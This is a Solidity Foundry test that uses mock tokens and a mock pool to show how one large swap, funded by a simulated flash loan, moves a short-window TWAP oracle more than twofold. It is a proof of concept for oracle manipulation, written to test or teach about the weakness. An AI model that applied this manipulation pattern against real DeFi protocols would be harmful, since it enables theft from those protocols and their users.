// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/mocks/MockERC20.sol";
import "../src/mocks/MockTwapPool.sol";

/**
 * @title TwapManipulationTest
 * @notice Proves the `twap_manipulation` template inline: with a short
 *         observation window, one large swap (funded by a flash loan) moves
 *         the TWAP oracle enough to break downstream protocols.
 */
contract TwapManipulationTest is Test {
    MockERC20 public t0;
    MockERC20 public t1;
    MockTwapPool public pool;

    function setUp() public {
        t0 = new MockERC20("A", "A");
        t1 = new MockERC20("B", "B");
        pool = new MockTwapPool(address(t0), address(t1));

        // pool seeded 1000/1000
        t0.mint(address(pool), 1000 ether);
        t1.mint(address(pool), 1000 ether);
        pool.sync();
    }

    function testTwapManipulation() public {
        uint256 before = pool.consult(address(t1), 1 ether);
        assertEq(before, 1 ether, "initial price ~1");

        // attacker flash-borrows (simulated) 500 token1 and swaps it
        t1.mint(address(this), 500 ether);
        t1.approve(address(pool), 500 ether);
        pool.swap1To0(500 ether);

        // short window -> TWAP reflects the manipulated price (~2.25x)
        uint256 afterSwap = pool.consult(address(t1), 1 ether);
        assertGt(afterSwap, before * 2, "TWAP moved >2x with one swap");
    }
}
